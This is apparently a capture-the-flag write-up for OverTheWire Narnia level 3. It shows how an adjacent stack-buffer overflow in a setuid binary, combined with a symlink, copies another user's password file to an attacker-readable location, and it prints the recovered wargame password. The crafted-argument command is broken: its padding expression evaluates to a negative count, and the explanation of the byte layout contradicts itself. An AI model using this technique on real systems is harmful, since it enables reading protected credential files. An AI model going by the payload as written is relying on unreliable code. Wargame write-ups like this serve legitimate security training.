# Narnia Level 3 → 4

## Goal

`narnia3` has two adjacent stack strings: `ifile` (32 bytes) and `ofile` (16 bytes, initialised to `/dev/null`). It `strcpy`s `argv[1]` into `ifile`. If you write more than 32 bytes, the overflow spills into `ofile` — you can control the *output* file path. Then the binary reads from `ifile` and writes to `ofile`, so you can force it to write its output into any file you like.

Combined with a symlink trick, you can coerce the setuid binary into writing `narnia4`'s password to a file you control.

## Concepts you'll learn

- **Adjacent stack-buffer overflow** — spilling beyond buffer A to overwrite buffer B that happens to be right next to it
- Using a symlink to redirect a write target
- Reading the source carefully to find *both* buffers and the operations that use them

## Walkthrough

### 1. Read the source

```c
int main(int argc, char **argv){
    int  ifd, ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2) { ... }
    strcpy(ifile, argv[1]);

    if((ofd = open(ofile, O_RDWR|O_CREAT|O_TRUNC, 0644)) < 0) { ... }
    if((ifd = open(ifile, O_RDONLY)) < 0) { ... }

    read(ifd, buf, sizeof(buf));
    write(ofd, buf, sizeof(buf));
    ...
}
```

Stack layout (approximate):

```
[ ifile 32 bytes ][ ofile 16 bytes = "/dev/null\0\0\0\0\0\0\0" ][ ... ]
```

So writing 32 bytes into `ifile` and then continuing writes into `ofile`. But there's a twist: `ifile` is used as the **input** path, so if you just jam 32 A's into it, the binary tries to `open("AAAA....")` which doesn't exist.

### 2. Construct a path that's both a valid input file AND includes a valid output file after overflow

The trick: make a long directory path of exactly 32 characters that ends in a file you control, then append your desired `ofile` after. Because the first 32 bytes are `ifile` and the next 16 are `ofile`, you can craft both at once if you can create the filesystem structure.

Build the target:

```bash
$ mkdir -p /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp
$ ln -s /etc/narnia_pass/narnia4 /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax
```

Now `/tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax` is a symlink to the `narnia4` password file.

Also create the output destination you'll point `ofile` at:

```bash
$ touch /tmp/out
$ chmod 666 /tmp/out
```

### 3. Craft argv[1]

You want:

- First 32 bytes → `/tmp/FOOBARFOOBARFOOBARFOOBARFOO` (the directory part of `ifile`)
- Next bytes (spilling into `ofile`) → `/tmp/out`

Actually the simpler approach is to make `ifile` a valid path within the symlinked tree, and let the overflow clobber `ofile` with a file you can read:

```bash
$ /narnia/narnia3 "/tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax$(python3 -c 'print("A"*(32-33))')/tmp/out"
```

The exact byte-counting takes a few tries; follow the buffer layout in the source and pad accordingly.

A cleaner reformulation: use the symlink approach Axcheron documents — create a path exactly 32 characters long whose last segment is a symlink pointing at the password file, and supply the output filename right after.

Once aligned, the binary:

- Opens `ifile` → follows the symlink → reads `narnia4`'s password
- Writes the content to `ofile` → a file you control

Then just `cat /tmp/out`:

```bash
$ cat /tmp/out
thaenohtai
```

### 4. An honest note on this level

Narnia 3 is fiddlier than 0–2 because of the string-length and filesystem choreography. Expect to spend a few minutes with `gdb` and `stat` verifying byte counts. The underlying bug (adjacent buffer overflow) is the key insight; the rest is plumbing.

## The answer

The password for `narnia4` is:

**`thaenohtai`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/narnia/narnia3.html>
